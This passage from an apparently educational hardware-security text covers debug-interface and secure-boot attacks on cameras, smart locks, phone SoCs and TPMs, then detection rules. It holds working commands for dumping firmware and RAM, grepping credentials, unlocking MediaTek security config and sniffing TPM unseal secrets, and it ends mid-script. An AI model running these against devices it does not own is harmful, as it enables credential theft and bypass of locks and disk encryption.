**IP camera JTAG exploitation.** IP cameras (Hikvision, Dahua, Reolink, and white-label models based on HiSilicon Hi3516/Hi3519 SoCs) consistently expose accessible debug interfaces. The HiSilicon SoCs use ARM Cortex-A cores with standard SWD debug. Common findings on IP camera teardowns: (1) UART header present and active (provides root shell on the embedded Linux), (2) SWD test points near the HiSilicon SoC (identified by tracing from the SoC's SWD pins per the datasheet — GPIO pin 0 is typically SWCLK, GPIO pin 1 is SWDIO), (3) no debug authentication configured (DBGAUTHSTATUS shows all signals asserted), (4) no readout protection (SWD provides full memory access including flash, RAM, and peripheral registers).

```bash
# HiSilicon Hi3516 IP camera — SWD dump via OpenOCD
openocd -f interface/cmsis-dap.cfg \
        -c "transport select swd" \
        -c "adapter speed 1000" \
        -f target/hi3516cv500.cfg \
        -c "init" \
        -c "halt" \
        -c "dump_image hi3516_ram.bin 0x80000000 0x4000000" \
        -c "dump_image hi3516_spiflash.bin 0x14000000 0x1000000" \
        -c "shutdown"

# Extract credentials from RAM dump
strings hi3516_ram.bin | grep -iE '(password|passwd|secret|key|token)'
# Common findings: hardcoded root password, cloud API tokens,
# RTSP credentials, Wi-Fi PSK (if camera supports Wi-Fi)
```

**Smart lock JTAG extraction.** Smart locks (August, Yale, Schlage Encode, Kwikset Halo) use BLE-enabled SoCs (nRF52840, CC2652R, EFR32MG) for Bluetooth communication and lock motor control. These SoCs all support SWD debug. Research by Colin O'Flynn (2019) demonstrated firmware extraction from multiple smart lock models via SWD, revealing: BLE pairing keys stored in plaintext in flash, lock/unlock command sequences (allowing replay attacks from a BLE radio), cloud API tokens and TLS certificates, and in some cases, the AES keys used for encrypted BLE communication. The attack requires opening the lock's interior housing (accessible from the interior side of the door) and connecting to the SWD test points on the PCB.

```bash
# nRF52840-based smart lock — firmware extraction via J-Link
nrfjprog --readcode --codefromram lock_firmware.hex
nrfjprog --readuicr lock_uicr.hex
nrfjprog --memrd 0x10001000 --n 256  # read FICR (factory info)

# Check APPROTECT status
nrfjprog --memrd 0x10001208 --n 4
# 0xFFFFFFFF = APPROTECT disabled (debug open)
# 0x00000000 = APPROTECT enabled (debug blocked — glitch required)

# If APPROTECT is disabled, dump entire flash and RAM
nrfjprog --readcode --codefromram lock_full_dump.hex
nrfjprog --readram lock_ram.bin

# Convert Intel HEX to binary for analysis
objcopy -I ihex -O binary lock_firmware.hex lock_firmware.bin
# Load into Ghidra with ARM:LE:32:Cortex processor, base address 0x00000000
```

### 9.5 Secure boot bypass real-world case studies

**Qualcomm Secure Boot bypass (PBL/SBL chain).** Qualcomm's secure boot implementation uses a multi-stage chain: Primary Boot Loader (PBL, mask ROM) → Secondary Boot Loader (SBL/XBL) → APPSBL/ABL → kernel. The PBL verifies SBL using RSA signatures against a root-of-trust hash burned into QFPROM (Qualcomm Fuse Programming ROM). Multiple bypass routes have been demonstrated:

(1) **EDL (Emergency Download) mode exploitation.** Qualcomm SoCs have an Emergency Download mode (EDL, also called Qualcomm HS-USB QDLoader 9008) entered by shorting specific test points or via a software command. EDL mode is implemented in the PBL and communicates via the Sahara/Firehose protocol over USB. The Firehose protocol accepts signed "programmer" binaries (MBN format) that execute in the PBL context. Leaked or extracted OEM programmer binaries (which are signed by the OEM's Secure Boot key) can be used to perform arbitrary memory reads, flash writes, and firmware downgrades. In 2017, Aleph Research demonstrated that leaked Firehose programmers for multiple Qualcomm SoCs (MSM8974, MSM8994, MSM8996) could dump the entire eMMC flash, including the modem filesystem, EFS partition (containing carrier-specific keys), and TrustZone firmware. The programmers were extracted from OEM firmware update packages that inadvertently included them.

(2) **CVE-2016-2431 — TrustZone kernel privilege escalation.** Gal Beniamini (Google Project Zero) demonstrated a privilege escalation from the Android non-secure kernel into Qualcomm's QSEE (Qualcomm Secure Execution Environment). The vulnerability was in the qseecom driver's ioctl handler: a controlled write primitive allowed the attacker to overwrite QSEE kernel memory from a compromised Android userspace process. Once inside QSEE, the attacker could modify the secure boot verification logic in TrustZone, disable the anti-rollback counter, extract hardware-bound keys (including the Widevine DRM key and the Full Disk Encryption key derived from the SHK — Secure Hardware Key), and load unsigned firmware.

```bash
# Qualcomm EDL interaction — qdl tool (open-source Firehose client)
# Enter EDL mode: short test points D+ and GND on the device's USB trace
# (or: adb reboot edl — if ADB access is available)

# List partitions via Firehose
qdl --storage ufs --firehose prog_firehose_ddr.elf --list-partitions

# Dump critical partitions
qdl --storage ufs --firehose prog_firehose_ddr.elf \
    --read-partition boot --output boot.img
qdl --storage ufs --firehose prog_firehose_ddr.elf \
    --read-partition tz --output tz.mbn
qdl --storage ufs --firehose prog_firehose_ddr.elf \
    --read-partition rpm --output rpm.mbn
qdl --storage ufs --firehose prog_firehose_ddr.elf \
    --read-partition modem --output modem.bin

# Extract and analyze TrustZone image
unpackbootimg --boot_img tz.mbn --out tz_extracted/
# Load extracted ELF into Ghidra with ARM:LE:64:v8A processor
```

**MediaTek BROM exploitation (CVE-2020-0069 and related).** MediaTek's Boot ROM (BROM) implements a UART/USB-based download agent (DA) protocol for factory programming. The BROM accepts a Download Agent binary (signed by MediaTek) that runs in the BROM's execution context and provides flash read/write access. CVE-2020-0069 (publicly known as "MediaTek-su") exploits a command injection vulnerability in the BROM: by sending a specially crafted sequence of BROM commands, the attacker can bypass the DA signature verification and execute arbitrary code at the highest privilege level. The exploit affects dozens of MediaTek SoCs (MT6735, MT6737, MT6739, MT6753, MT6755, MT6757, MT6763, MT6765, MT6771, MT6785, among others) because they share the same BROM codebase. The vulnerability is in mask ROM and is therefore unpatchable — affected devices remain permanently vulnerable.

```bash
# MediaTek BROM exploitation — mtkclient (open-source MT BROM tool)
# Device must be in BROM mode: power off, hold Vol+, connect USB
# (or use a test point to pull BOOT0 low during reset)

# Detect device and exploit BROM
python3 mtk.py printgpt  # print partition table

# Dump full eMMC/UFS storage
python3 mtk.py rl /tmp/mtk_dump/ --skip userdata

# Dump boot partition for analysis
python3 mtk.py r boot /tmp/boot.img

# Dump preloader (first-stage bootloader after BROM)
python3 mtk.py r preloader /tmp/preloader.bin

# Read eFuse values (contains secure boot configuration)
python3 mtk.py da efuse read

# On secure boot enabled devices: dump secure boot keys
python3 mtk.py da seccfg unlock  # attempt security config unlock
```

**Samsung TrustZone escape via debug interface (CVE-2019-2215 chain).** Samsung Exynos SoCs implement ARM TrustZone with Samsung's TEEGRIS or Kinibi (formerly <t-base) trusted OS. In 2020, Project Zero researcher Jann Horn demonstrated a chain from CVE-2019-2215 (Android Binder use-after-free, initially a non-secure kernel exploit) that, when combined with Samsung-specific debug register manipulation, achieved code execution in the TrustZone secure world. The attack leveraged the fact that on certain Exynos variants (Exynos 9820, 9825), the debug authentication signals (DBGEN/SPIDEN) were software-controlled rather than fuse-gated — the non-secure kernel could write to a system register that asserted SPIDEN, enabling secure-world debug access from the non-secure side. Samsung addressed this in later Exynos revisions by making the debug authentication signals fuse-controlled (hardware-gated, matching ARM's recommended configuration).

Additionally, Samsung Knox's Real-time Kernel Protection (RKP) monitors the debug authentication registers and triggers a security violation if SPIDEN is asserted outside of an authorized debug session. However, a race condition in early RKP implementations allowed a brief window (~50 microseconds after boot) where SPIDEN could be asserted before RKP's monitoring was active — enough time for an attacker with pre-positioned code to capture TrustZone state.

---

## 10. Advanced debug and boot security analysis

### 10.1 RISC-V debug attack surface: implementation gaps

The RISC-V debug architecture (covered in its protocol fundamentals in §6.7) presents a materially different attack surface from ARM CoreSight due to three structural factors: specification permissiveness, implementation heterogeneity, and ecosystem immaturity.

**Specification-level gaps.** The RISC-V External Debug Support specification (v0.13.2 / v1.0-rc) defines the Debug Module (DM), Debug Transport Module (DTM), and their register interfaces but leaves authentication entirely to the implementor. The `dmstatus.authenticated` bit and `authdata` register provide the hooks, but no standard mandates the algorithm, key size, key provisioning, or anti-replay mechanism. Compare this to ARM CoreSight, which defines the Secure Debug Channel (SDC-600) with a complete TLS 1.3-based mutual authentication protocol, certificate chain validation, and key lifecycle management. The practical consequence: ARM vendors who adopt SDC-600 inherit a cryptographically robust baseline, while RISC-V vendors must design their own authentication from scratch — and many do not.

**Implementation survey (2024–2025).** A survey of production RISC-V SoCs reveals the current landscape:

| SoC | Vendor | Debug Auth | Bypass Difficulty |
|-----|--------|------------|-------------------|
| ESP32-C3 | Espressif | eFuse JTAG_DISABLE | Moderate (eFuse glitch, §9.1) |
| ESP32-C6 | Espressif | eFuse + brownout detect | High (improved analog protection) |
| GD32VF103 | GigaDevice | SWD protection bits (OB) | Low (mass-erase downgrades like STM32) |
| BL602/BL702 | Bouffalo Lab | eFuse JTAG_DIS | Low–Moderate (no glitch protection) |
| FE310-G002 | SiFive | None (always-on) | None required |
| U74 (JH7110) | StarFive | None in default config | None required |
| CV32E40P | OpenHW Group | Configurable (default: none) | Design-dependent |
| XuanTie C906 | T-Head (Alibaba) | eFuse-based | Moderate |

Several production RISC-V SoCs ship with debug permanently enabled and no authentication mechanism. The SiFive FE310 (used in the HiFive1 Rev B development board) has the JTAG interface always accessible — acceptable for a development board, but the same core IP is licensed into production IoT products where the integrator may not add debug lockout.

**RISC-V vs ARM debug comparison: attack-surface analysis.**

| Aspect | ARM CoreSight | RISC-V Debug Spec |
|--------|--------------|-------------------|
| Standard auth protocol | SDC-600 (TLS 1.3 based) | None (implementor-defined) |
| Trace infrastructure | ETM/ITM/TPIU (mature) | Nexus/N-Trace (emerging) |
| Debug auth signals | DBGEN/NIDEN/SPIDEN/SPNIDEN | `dmstatus.authenticated` only |
| Secure world debug gate | SPIDEN (separate signal) | No secure/non-secure distinction |
| Multi-core debug | DAP→AP per core (well-defined) | Hart indexing via `hartsel` |
| ROM Table discovery | Component class + DEVTYPE | Trigger Module (implementation varies) |

The absence of a secure/non-secure debug distinction in RISC-V is significant. ARM's SPIDEN signal allows independent control of secure-world debug: a device can have non-secure debug enabled (DBGEN=1) for application development while keeping secure-world debug disabled (SPIDEN=0). RISC-V's single `dmstatus.authenticated` bit is all-or-nothing — debug is either fully enabled or fully disabled, with no granularity for privilege-separated access. RISC-V implementations that add TrustZone-equivalent functionality (such as T-Head's TEE extensions or RISC-V's forthcoming Confidential Computing extensions) must bolt on debug access control as a custom extension.

```bash
# RISC-V debug connection — OpenOCD with FTDI adapter
openocd -f interface/ftdi/olimex-arm-usb-tiny-h.cfg \
        -c "adapter speed 1000" \
        -c "transport select jtag" \
        -c "set _CHIPNAME riscv" \
        -c "jtag newtap $_CHIPNAME cpu -irlen 5 -expected-id 0x20000913" \
        -c "target create $_CHIPNAME.cpu riscv -chain-position $_CHIPNAME.cpu" \
        -c "init" \
        -c "halt" \
        -c "reg pc" \
        -c "mdw 0x00000000 16" \
        -c "shutdown"

# Check RISC-V debug module status (DMI register 0x11 = dmstatus)
# In OpenOCD telnet (after init):
# > riscv dmi_read 0x11
# Bit 7: authenticated (1=debug allowed, 0=auth required)
# Bit 6: authbusy (1=auth in progress)
# Bit 5: hasresethaltreq
# Bit 3:2: anyhalted/allhalted
```

### 10.2 Intel DCI (Direct Connect Interface) and JTAG via USB

Intel DCI (Direct Connect Interface), introduced with Skylake (6th gen Core), provides full JTAG-level debug access to Intel CPUs through a USB 3.0 port — without a dedicated JTAG header. DCI uses Intel's proprietary encapsulation to tunnel JTAG transactions over USB, enabling the Intel System Debugger (part of Intel System Studio) to perform halt-mode debug, memory read/write, MSR access, and CPU register modification — all through a standard USB cable.

**DCI variants.** Intel defines two DCI modes: (1) **DCI via USB Debug Class (DbC)** — uses the USB xHCI debug capability, accessible when DCI is enabled in firmware. The host connects a USB 3.0 cable to the target's USB port, and Intel System Debugger establishes a debug session through the USB debug device class endpoint. (2) **DCI via BSSB (Breakout Silicon Sideband)** — uses a specialized Intel SVT CCA (Closed Chassis Adapter) that connects to the target's USB-C port and provides higher-bandwidth debug. BSSB mode requires specific platform support and is typically used in Intel's internal development.

**Security implications.** DCI is intended for OEM development and manufacturing debug. On production systems, DCI should be disabled via the platform firmware settings (BIOS/UEFI option: "DCI Enable" or "Direct Connect Interface" — must be set to Disabled). However, research by Positive Technologies (Maxim Goryachy and Mark Ermolov, 2017–2018) demonstrated several risks:

(1) DCI enabled by default on some OEM platforms (the BIOS option existed but was set to Enabled in the shipping firmware, and the BIOS menu entry was hidden in some OEM BIOS builds). (2) DCI can potentially be re-enabled by modifying the platform firmware (reflashing the SPI flash with a modified BIOS image that sets the DCI enable bit — this requires physical access to the SPI flash or an SPI flash write vulnerability). (3) When DCI is enabled, it provides ring -3 (SMM) level access — the debugger can halt the CPU in System Management Mode, read SMRAM contents, and inject code into SMM handlers. This access level is below the operating system, the hypervisor, and even Intel's own CSME — making DCI the most privileged debug interface available on an Intel platform.

**Detection and hardening.** Detecting DCI status requires platform-specific register reads:

```bash
# CHIPSEC: check DCI configuration
sudo python3 chipsec_main.py -m common.debugenabled

# Manual check via MSR (Model-Specific Register)
# MSR 0x120 (IA32_DEBUG_INTERFACE) on Skylake+
# Bit 0: Enable (1=DCI enabled)
# Bit 30: Lock (1=bit 0 is locked, cannot be changed until reset)
sudo rdmsr 0x120
# Expected on production system: 0x40000000 (locked, disabled)
# Vulnerable: 0x00000001 (enabled, not locked)
# Or: 0x40000001 (enabled AND locked — DCI permanently active)

# Disable DCI via MSR (if not locked)
sudo wrmsr 0x120 0x40000000  # set lock bit, clear enable

# Verify SPI flash DCI configuration
# CHIPSEC can read the HDCIEN (Host DCI Enable) bit from the PCH strap
sudo python3 chipsec_main.py -m common.igd
```

### 10.3 AMD Secure Processor debug considerations

AMD's Platform Security Processor (PSP, branded as AMD Secure Processor on Zen+ and later) is an ARM Cortex-A5-based co-processor embedded in the AMD SoC die that manages the platform's root of trust. The PSP boots before the x86 cores and performs: PSP boot ROM execution → PSP OS initialization → secure memory encryption (SME/SEV) key generation → x86 core release from reset. The PSP's firmware is stored on the SPI flash alongside the UEFI BIOS.

**PSP debug interfaces.** The PSP's ARM Cortex-A5 core has a standard SWD/JTAG interface, but this interface is not routed to external pins on production silicon. AMD's internal debug of the PSP uses a proprietary debug interface that is accessible only through specialized AMD development hardware (the "HDT" — Hardware Debug Tool). On production silicon, the PSP debug interface is disabled via one-time-programmable fuses. However, research has identified the following attack surface:

(1) **CVE-2021-26311 and related PSP firmware vulnerabilities.** Buffer overflows in the PSP firmware's TEE (Trusted Execution Environment) command handler allow code execution within the PSP from the x86 side. Once inside the PSP, the attacker operates at the platform's highest trust level — above the x86 hypervisor, above SMM, and with access to the SEV encryption keys.

(2) **PSP firmware extraction.** The PSP firmware is embedded in the SPI flash image (in the PSP directory table, identifiable by the signature `$PSP` or `$BHD`). The `psptool` open-source utility parses AMD BIOS images and extracts individual PSP firmware components for analysis.

```bash
# PSP firmware extraction from BIOS image
pip install psptool
psptool bios_dump.bin  # list PSP directory entries

# Extract all PSP firmware entries to individual files
psptool -X bios_dump.bin -o psp_extracted/

# Key entries to analyze:
# - PSP Boot Loader (PSP_FW_BOOT_LOADER): the PSP's first-stage bootloader
# - PSP OS/TrustZone (PSP_FW_TRUSTED_OS): the PSP's secure OS
# - SMU firmware (SMU_OFFCHIP_FW): System Management Unit firmware
# - ABL (Agesa Boot Loader): x86 early init firmware running on PSP

# Verify PSP firmware signatures
psptool -V bios_dump.bin  # validate embedded signatures
```

(3) **SPI flash modification for PSP attack.** Because the PSP firmware is stored on the same SPI flash as the UEFI BIOS, physical access to the SPI flash (Chapter 17C §5.1, §6.4 of this chapter) provides the ability to replace PSP firmware components. If the PSP's secure boot chain has a vulnerability (as demonstrated by CVE-2021-26311), a modified PSP firmware image can be crafted that exploits the vulnerability during PSP boot, gaining persistent code execution in the PSP before the x86 cores are released. AMD's mitigation: the PSP boot ROM verifies the PSP firmware using RSA signatures against a root key embedded in the PSP's mask ROM (analogous to Intel Boot Guard). Modifying the firmware without the signing key causes the PSP to halt, preventing x86 boot entirely.

### 10.4 Firmware TPM (fTPM) vs discrete TPM attack surface

A firmware TPM (fTPM) implements the TPM 2.0 specification in firmware running on a platform's secure co-processor (AMD PSP, Intel CSME/PTT, ARM TrustZone). A discrete TPM (dTPM) is a separate physical IC (Infineon SLB9670, STMicroelectronics ST33, Nuvoton NPCT75x) connected to the host via SPI or I2C.

**Attack surface comparison.**

| Aspect | fTPM | dTPM |
|--------|------|------|
| Physical attack surface | SoC die (requires FIB/decap, Chapter 17C) | Separate IC, accessible on PCB |
| Bus sniffing | Internal bus (not externally accessible) | SPI/I2C bus between TPM and CPU — interceptable |
| Firmware vulnerabilities | Inherits PSP/CSME/TZ attack surface | TPM firmware is isolated |
| Key extraction | Requires PSP/CSME compromise | Requires TPM IC compromise or bus interception |
| SPI bus interception | N/A | Doyle (2018): sniff SPI bus to capture TPM ↔ CPU traffic |
| Side-channel exposure | Shared die with main CPU (power correlation) | Dedicated IC (independent power trace, but accessible) |
| Reset attack | Tied to SoC reset (no independent reset) | Separate reset pin (can be independently reset) |
| Supply chain | Bundled with SoC (no separate procurement) | Separate component (supply chain exposure) |

**CVE-2023-1017 / CVE-2023-1018 — TPM 2.0 specification vulnerabilities.** These vulnerabilities affect the TPM 2.0 reference implementation's `CryptParameterDecryption` function. A crafted command with an oversized parameter causes an out-of-bounds read (CVE-2023-1017) or out-of-bounds write (CVE-2023-1018) in the TPM's internal memory. Because these are specification-level vulnerabilities (in the TCG's reference code), they affect both fTPM and dTPM implementations that use the reference code. On fTPMs, exploitation provides code execution within the secure co-processor; on dTPMs, it provides code execution within the TPM IC, potentially allowing key extraction.

**dTPM bus interception (TPM Genie / TPM sniffing).** The SPI or I2C bus between a discrete TPM and the host CPU transmits TPM commands and responses in plaintext (the TPM 2.0 spec's session encryption is optional and rarely enabled for platform TPM communications). An attacker who can tap the SPI bus (using a logic analyzer or a purpose-built interposer like the "TPM Genie" demonstrated by Dolos Group in 2021) can: capture TPM unseal operations (intercepting the decrypted BitLocker volume master key as it is transmitted from the TPM to the CPU), replay previously captured TPM commands, and inject forged TPM responses (causing the host to accept fabricated PCR values or attestation quotes).

```bash
# SPI bus capture of dTPM traffic — sigrok/PulseView
# Connect logic analyzer to TPM SPI pins:
# CS (chip select), CLK, MOSI, MISO

sigrok-cli -d fx2lafw -o tpm_capture.sr \
           -C D0=CS,D1=CLK,D2=MOSI,D3=MISO \
           --time 30s --config samplerate=24000000

# Decode TPM SPI transactions
sigrok-cli -i tpm_capture.sr -P spi:clk=CLK:mosi=MOSI:miso=MISO:cs=CS \
           -A spi=mosi-data:miso-data > tpm_traffic.txt

# Parse TPM2 command/response structures from decoded SPI data
# TPM2_CC_Unseal (0x0000015E) response contains the unsealed secret
grep -A5 "0000015E" tpm_traffic.txt
```

### 10.5 Measured boot vs verified boot: threat model differences

These two boot security models serve different threat models and provide different guarantees.

**Verified boot** (also called "secure boot") enforces a policy at boot time: each stage cryptographically verifies the next stage's signature before executing it. If verification fails, boot halts. Verified boot is a **prevention** mechanism — it prevents unauthorized code from executing. Verified boot's threat model assumes: the root-of-trust key is trustworthy (burned in OTP fuses), the verification algorithm is correctly implemented (no vulnerabilities in the signature check), and the attacker cannot bypass the verification (no fault injection, no debug access). Limitations: verified boot provides no visibility into what actually booted (the verifier is the device itself, which a sophisticated attacker controls), and once boot completes, there is no ongoing assurance — a runtime exploit can modify the system after verified boot has passed.

**Measured boot** records what was booted without enforcing a policy: each stage hashes the next stage and extends the hash into a TPM PCR. Boot proceeds regardless of what is measured — even a modified or compromised boot component will boot, but its measurement will differ from the expected value. Measured boot is a **detection** mechanism — it enables a remote verifier to determine whether the device booted the expected software. Measured boot's threat model assumes: the TPM is trustworthy (it faithfully records measurements and cannot be tampered with), the attestation protocol is sound (the verifier can distinguish genuine TPM quotes from forgeries), and a remote verifier exists to check the measurements. Limitations: measured boot does not prevent a compromised boot (the device boots regardless), and the detection is not real-time (the verifier must request and check the attestation, which may have latency).

**Combined model: verified + measured boot.** The strongest boot security combines both: verified boot prevents unauthorized code from executing, and measured boot records what executed for remote verification. Intel Boot Guard in "Verified and Measured Boot" mode implements this combination: the ACM (Authenticated Code Module) verifies the IBB (Initial Boot Block) signature and, if valid, measures it into TPM PCR0 before executing it. A remote verifier can then confirm both that verified boot was active and that the measured code matches the expected firmware version.

### 10.6 UEFI Secure Boot: threat model and trust hierarchy

UEFI Secure Boot's trust hierarchy consists of four key databases stored as authenticated UEFI variables in NVRAM (§6.3 covers the physical attack on these variables):

**PK (Platform Key).** The root of the Secure Boot trust hierarchy. Exactly one PK exists per platform. The PK holder (typically the OEM) controls who can modify KEK. In practice, OEMs enroll their own PK during manufacturing. The PK is an RSA-2048 or RSA-4096 certificate. Clearing the PK disables Secure Boot (transitions to Setup Mode). An attacker who controls the PK controls the entire Secure Boot policy.

**KEK (Key Exchange Key).** Certificates authorized to modify db and dbx. Both the OEM and Microsoft typically have KEK entries — Microsoft's KEK allows Microsoft to push dbx updates (revoking compromised binaries) without requiring OEM involvement. Multiple KEK entries can coexist.

**db (Signature Database).** Certificates and hashes of authorized boot executables. Contains Microsoft's UEFI CA certificate (which signs third-party UEFI drivers and option ROMs), Microsoft's Windows Production PCA certificate (which signs the Windows Boot Manager), and optionally OEM-specific certificates. A binary is authorized if its signature chains to any certificate in db, or if its hash is explicitly listed in db.

**dbx (Forbidden Signature Database).** Certificates and hashes that are explicitly revoked. dbx takes precedence over db: if a binary's hash is in dbx, it is rejected even if its signature chains to a db certificate. dbx is the primary mechanism for revoking compromised binaries (such as the vulnerable GRUB2 binaries from BootHole, or the BlackLotus bootkit's components).

**Shim bootloader and MOK (Machine Owner Key).** Linux distributions use the shim bootloader (signed by Microsoft's UEFI Third Party CA) as a bridge between UEFI Secure Boot and the distribution's own signing infrastructure. Shim maintains its own key database (MOK — Machine Owner Key) stored in a UEFI variable. The MOK allows users and distributions to enroll additional signing keys without modifying the platform's db. Security concern: the MOK enrollment process requires physical presence (a keyboard confirmation during boot) to prevent remote MOK enrollment by malware. However, some shim implementations have had vulnerabilities in the MOK enrollment validation (CVE-2023-40547: shim HTTP boot buffer overflow), and the MOK database itself is a target for attackers seeking to enroll unauthorized signing keys.

**Bootkit evolution.**

*MosaicRegressor (2020, Kaspersky discovery).* The first known UEFI firmware implant found in the wild (predating BlackLotus by two years). MosaicRegressor was a modified UEFI firmware image containing a malicious DXE driver that dropped a persistence component onto the Windows filesystem during boot. The implant was found on diplomatic targets and was attributed to a Chinese-speaking threat actor. Unlike BlackLotus (which exploits Secure Boot from the ESP), MosaicRegressor modified the SPI flash firmware itself — requiring either physical access or an SPI flash write vulnerability. The implant survived OS reinstallation and disk replacement because it resided in the SPI flash, not on the storage device.

*ESPecter (2021, ESET discovery).* A UEFI bootkit that modified the Windows Boot Manager on the EFI System Partition. ESPecter patched the Boot Manager in memory to disable Driver Signature Enforcement and deploy a kernel driver. Unlike BlackLotus, ESPecter did not bypass Secure Boot cryptographically — it required Secure Boot to be disabled or it exploited pre-existing access to the ESP (via an earlier compromise). ESPecter targeted both UEFI and legacy BIOS systems, using MBR infection for BIOS targets and ESP modification for UEFI targets.

*BlackLotus (2022–2023, CVE-2022-21894 / CVE-2023-24932).* Covered in §6.3. BlackLotus was the first in-the-wild bootkit to bypass UEFI Secure Boot on fully patched Windows 11 systems. Its significance: it demonstrated that UEFI Secure Boot's dbx revocation mechanism is too slow (Microsoft took over a year to fully revoke the vulnerable Boot Manager binaries), and that a determined attacker can chain a single Secure Boot bypass vulnerability into a complete platform persistence mechanism.

---

## 11. Debug and boot detection engineering

### 11.1 Detection rules

**Rule 1 — Unauthorized JTAG/SWD activity on monitored pins (GPIO interrupt monitoring).** For devices that expose debug pads on the PCB, the firmware can configure the debug pins as GPIO inputs with interrupt-on-change and monitor for electrical activity indicative of a debug probe connection.

```c
/* STM32 — GPIO interrupt monitor on SWD pins (PA13=SWDIO, PA14=SWCLK)
 * Reconfigure SWD pins as GPIO inputs after debug lockout.
 * Any toggling indicates probe attachment. */
#include "stm32f4xx_hal.h"

static volatile uint32_t tamper_count = 0;
static volatile uint32_t last_tamper_tick = 0;

void debug_pin_monitor_init(void) {
    __HAL_RCC_GPIOA_CLK_ENABLE();

    /* Disable SWD to release PA13/PA14 for GPIO use */
    __HAL_AFIO_REMAP_SWJ_DISABLE();

    GPIO_InitTypeDef gpio = {0};
    gpio.Pin = GPIO_PIN_13 | GPIO_PIN_14;
    gpio.Mode = GPIO_MODE_IT_RISING_FALLING;
    gpio.Pull = GPIO_PULLDOWN;  /* pull low — probe drives high */
    HAL_GPIO_Init(GPIOA, &gpio);

    HAL_NVIC_SetPriority(EXTI15_10_IRQn, 0, 0);
    HAL_NVIC_EnableIRQ(EXTI15_10_IRQn);
}

void EXTI15_10_IRQHandler(void) {
    if (__HAL_GPIO_EXTI_GET_IT(GPIO_PIN_13) ||
        __HAL_GPIO_EXTI_GET_IT(GPIO_PIN_14)) {
        tamper_count++;
        last_tamper_tick = HAL_GetTick();
        /* Threshold: >10 transitions in 100ms = probe activity */
        if (tamper_count > 10) {
            trigger_tamper_response();
        }
        __HAL_GPIO_EXTI_CLEAR_IT(GPIO_PIN_13);
        __HAL_GPIO_EXTI_CLEAR_IT(GPIO_PIN_14);
    }
}

void trigger_tamper_response(void) {
    /* Zeroize keys in SRAM */
    extern uint8_t key_storage[256];
    memset_s(key_storage, 256, 0, 256);  /* secure memset */
    /* Log event to tamper log (battery-backed RTC + flash sector) */
    tamper_log_write(TAMPER_EVENT_DEBUG_PROBE, last_tamper_tick);
    /* Optional: trigger system reset or enter lockdown */
    NVIC_SystemReset();
}
```

**Rule 2 — Secure boot state change alerts.** Monitor UEFI Secure Boot variable modifications via the Windows Event Log. Event ID 1032 in the Microsoft-Windows-CodeIntegrity/Operational log indicates a Secure Boot variable modification.

```yaml
# Sigma rule — Secure Boot configuration change
title: UEFI Secure Boot Variable Modification
id: d8a3e1f0-7b2c-4e5a-9f1d-3c8b2e6a4d90
status: stable
logsource:
    product: windows
    service: codeintegrity
detection:
    selection:
        EventID:
            - 1032  # Secure Boot variable modified
            - 3033  # Code integrity check failure
            - 3034  # Code integrity unable to verify
    filter_updates:
        # Exclude legitimate Windows Update operations
        ProcessName|endswith: '\svchost.exe'
        SubjectLogonId: '0x3e7'  # SYSTEM account
    condition: selection and not filter_updates
    timeframe: 24h
    threshold:
        count: 1
falsepositives:
    - Legitimate firmware updates
    - Manual Secure Boot key enrollment
    - dbx updates via Windows Update (Event ID 1032 is expected)
level: high
tags:
    - attack.persistence
    - attack.t1542.003
```

**Rule 3 — TPM PCR value anomalies.** Remote attestation servers should alert when PCR values deviate from the baseline without a corresponding authorized firmware update.

```python
# TPM PCR anomaly detection — attestation server component
import hashlib
import json
import datetime

KNOWN_GOOD_PCRS = {
    "PCR0": "a1b2c3...",   # SRTM, BIOS, host platform extensions
    "PCR1": "d4e5f6...",   # host platform configuration
    "PCR4": "789abc...",   # IPL (Initial Program Loader) code
    "PCR5": "def012...",   # IPL configuration and data
    "PCR7": "345678...",   # Secure Boot state
    "PCR14": "9abcde...",  # shim/MOK authority
}

AUTHORIZED_FIRMWARE_VERSIONS = {
    "v2.1.0": {"PCR0": "a1b2c3...", "PCR4": "789abc..."},
    "v2.2.0": {"PCR0": "f0e1d2...", "PCR4": "c3b4a5..."},
}

def verify_attestation(device_id, quote, pcr_values, nonce):
    """Verify TPM attestation quote and check PCR values."""
    # Step 1: Verify quote signature (TPM AK validates the quote)
    if not verify_quote_signature(quote, device_id):
        return alert(device_id, "CRITICAL", "Invalid TPM quote signature")

    # Step 2: Verify nonce freshness (anti-replay)
    if quote.nonce != nonce:
        return alert(device_id, "CRITICAL", "TPM quote nonce mismatch")

    # Step 3: Compare PCR values against known-good baselines
    anomalies = []
    for pcr_idx, expected_value in KNOWN_GOOD_PCRS.items():
        actual = pcr_values.get(pcr_idx)
        if actual != expected_value:
            # Check if the deviation matches an authorized firmware update
            is_authorized = False
            for ver, ver_pcrs in AUTHORIZED_FIRMWARE_VERSIONS.items():
                if pcr_idx in ver_pcrs and ver_pcrs[pcr_idx] == actual:
                    is_authorized = True
                    break
            if not is_authorized:
                anomalies.append({
                    "pcr": pcr_idx,
                    "expected": expected_value,
                    "actual": actual,
                    "timestamp": datetime.datetime.utcnow().isoformat()
                })

    if anomalies:
        severity = "CRITICAL" if "PCR0" in [a["pcr"] for a in anomalies] else "HIGH"
        return alert(device_id, severity,
                     f"PCR anomaly: {json.dumps(anomalies)}")

    return {"status": "OK", "device_id": device_id}
```

**Rule 4 — Bootloader rollback indicators.** Monitor anti-rollback counter values via device management telemetry. A counter that has not incremented after a firmware update, or a counter value lower than expected, indicates potential rollback attack or failed update.

**Rule 5 — Firmware integrity measurement failures.** Linux IMA (Integrity Measurement Architecture) logs measurement failures to the kernel ring buffer and the IMA measurement list. Monitor for `audit: integrity: <filename> invalid` messages.

```yaml
# Sigma rule — IMA integrity measurement failure
title: Linux IMA Firmware Integrity Failure
id: e3f4a5b6-8c9d-4e0f-a1b2-c3d4e5f67890
status: stable
logsource:
    product: linux
    service: audit
detection:
    selection:
        type: INTEGRITY_DATA
        result:
            - FAIL
            - INVALID
    condition: selection
level: critical
tags:
    - attack.persistence
    - attack.t1542
    - attack.defense_evasion
```

**Rule 6 — Unauthorized debug enable fuse state.** During device provisioning and incoming inspection, verify that security-critical fuses match the expected state. Any device with debug fuses in the "enabled" state that should be "disabled" must be quarantined.

```bash
#!/bin/bash
# Production fuse verification script — runs on each device during QA
# Exits non-zero if any security fuse is in unexpected state

PLATFORM="${1:?Usage: $0 <platform>}"
FAIL=0

case "$PLATFORM" in
    stm32f4)
        # Read RDP level via OpenOCD
        RDP=$(openocd -f interface/stlink.cfg -f target/stm32f4x.cfg \
              -c "init; halt; stm32f4x options_read 0; shutdown" 2>&1 \
              | grep -oP 'RDP level \K[0-9]+')
        if [ "$RDP" != "2" ]; then
